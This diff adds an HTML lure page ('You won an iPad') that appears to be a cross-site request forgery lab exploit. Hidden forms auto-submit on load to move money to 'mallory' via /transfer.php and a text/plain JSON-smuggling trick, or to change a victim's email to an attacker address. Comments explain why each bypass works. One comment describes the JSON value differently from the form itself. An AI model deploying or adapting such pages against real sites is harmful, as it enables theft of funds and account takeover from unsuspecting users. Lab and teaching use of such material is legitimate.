@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>You won an iPad</title>
+</head>
+<body>
+<h1>You won an iPad</h1>
+<p>Loading your prize...</p>
+
+<!-- Classic form-CSRF: auto-submit a POST against /transfer.php. In a real
+     attack this lives on a different origin (attacker.example); for the lab
+     we serve it from the same host for convenience. The form-encoded POST is
+     CORS-safe so the browser sends it cross-origin without a preflight. -->
+
+<form id="classic" action="/transfer.php" method="POST">
+  <input type="hidden" name="to" value="mallory">
+  <input type="hidden" name="amount" value="500">
+</form>
+
+<!-- JSON-via-text/plain smuggle against /api/transfer.php. The serialisation
+     glitch (name = '{"to":"mallory","amount":250,"x":"' value '":1}') makes
+     this work as a plain HTML form without JS. -->
+
+<form id="jsonish" action="/api/transfer.php" method="POST" enctype="text/plain">
+  <input name='{"to":"mallory","amount":250,"x":"' value='"y"}'>
+</form>
+
+<!-- Broken-token endpoint: omit the csrf field entirely and the check is
+     skipped. -->
+
+<form id="emailchg" action="/email/change.php" method="POST">
+  <input type="hidden" name="email" value="mallory@evil.example">
+</form>
+
+<script>
+  // Fire one of the three on load. Toggle which by changing the id.
+  document.getElementById('classic').submit();
+</script>
+
+</body>
+</html>
